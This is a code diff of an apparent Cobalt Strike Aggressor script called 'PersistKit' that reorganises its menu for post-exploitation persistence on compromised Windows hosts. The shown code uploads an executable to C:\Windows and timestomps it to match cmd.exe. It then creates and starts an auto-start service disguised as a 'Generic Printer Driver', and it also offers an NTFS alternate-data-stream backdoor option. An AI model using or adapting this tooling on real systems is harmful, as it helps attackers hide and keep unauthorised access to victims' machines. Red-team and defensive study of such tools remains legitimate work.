@@ -45,39 +45,37 @@ sub getADSRegName {
 
 popup beacon_bottom {
 	menu "PersistKit" {
-		menu "Windows"{
-			item "Create Backdoor Service"{
-				local ('$bid');
-				foreach $bid ($1){
-					prompt_file_open("Select the service exe to use", $null, false, {
-						println("\c4Uploading backdoor on beacon $1 using file $2 ");
-						blog($1, "Attempting to publish backdoor service");
-						bcd($1, "C:\\Windows\\");
-						println("\c4Changed directory on beacon $1 to C:\\Windows\\");
-						bupload($1, $2);
-						servicefilename($2);
-						btimestomp($1, "$servicebackdoorfilename", "C:\\Windows\\system32\\cmd.exe")
-						prompt_text("Name of service to use?", "GenericPrinterDriver", {
-							$serviceName = $1;
-						});
-						prompt_text("Service Display Name to use?", "Generic Printer Driver Support", {
-							$serviceDisplayName = $1;
-						});
-						bshell($1, "sc create $serviceName binPath= \"C:\\Windows\\ $+ $servicebackdoorfilename $+ \" start= auto DisplayName= \" $serviceDisplayName \"");
-						bshell($1, "sc start $serviceName ");
-						blog($1, "Backdoor service created using $servicebackdoorfilename ");
-						println("\c9[+] Backdoor creation complete!");
+		item "Create Backdoor Service"{
+			local ('$bid');
+			foreach $bid ($1){
+				prompt_file_open("Select the service exe to use", $null, false, {
+					println("\c4Uploading backdoor on beacon $1 using file $2 ");
+					blog($1, "Attempting to publish backdoor service");
+					bcd($1, "C:\\Windows\\");
+					println("\c4Changed directory on beacon $1 to C:\\Windows\\");
+					bupload($1, $2);
+					servicefilename($2);
+					btimestomp($1, "$servicebackdoorfilename", "C:\\Windows\\system32\\cmd.exe")
+					prompt_text("Name of service to use?", "GenericPrinterDriver", {
+						$serviceName = $1;
 					});
-				}
+					prompt_text("Service Display Name to use?", "Generic Printer Driver Support", {
+						$serviceDisplayName = $1;
+					});
+					bshell($1, "sc create $serviceName binPath= \"C:\\Windows\\ $+ $servicebackdoorfilename $+ \" start= auto DisplayName= \" $serviceDisplayName \"");
+					bshell($1, "sc start $serviceName ");
+					blog($1, "Backdoor service created using $servicebackdoorfilename ");
+					println("\c9[+] Backdoor creation complete!");
+				});
 			}
-			item "Create NTFS ADS Backdoor"{
-					local ('$bid');
-					# Open a payload selection dialoge, passes it to createADSBackdoor()
-					foreach $bid ($1){
-						openPayloadHelper(lambda({
-						createADSBackdoor($bid, $1);
-					}, $bid => $1));
-				}
+		}
+		item "Create NTFS ADS Backdoor"{
+				local ('$bid');
+				# Open a payload selection dialoge, passes it to createADSBackdoor()
+				foreach $bid ($1){
+					openPayloadHelper(lambda({
+					createADSBackdoor($bid, $1);
+				}, $bid => $1));
 			}
 		}
 	}
